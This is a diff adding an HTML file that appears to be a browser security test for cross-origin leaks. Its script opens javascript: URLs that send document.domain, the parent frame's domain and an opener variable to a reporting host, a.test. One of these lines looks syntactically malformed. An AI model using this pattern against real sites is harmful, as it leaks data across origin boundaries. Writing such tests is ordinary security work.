@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+  par = 'val';
+  url1 = "javascript:'<scr" + "ipt>location.href=\"https://a.test/report/?leak=c582387-1&dom="+document.domain+"&Pdom="+parent.document.domain+"&par="+opener.par;\</scr" + "ipt>'";
+  open(url1);
+  url2 = "javascript:location.href='https://a.test/report/?leak=c582387-2&dom="+document.domain+"&Pdom="+parent.document.domain+"&par="+opener.par;);
+  open(url2);
+</script>
+</head>
+<body>
+</body>
+</html>
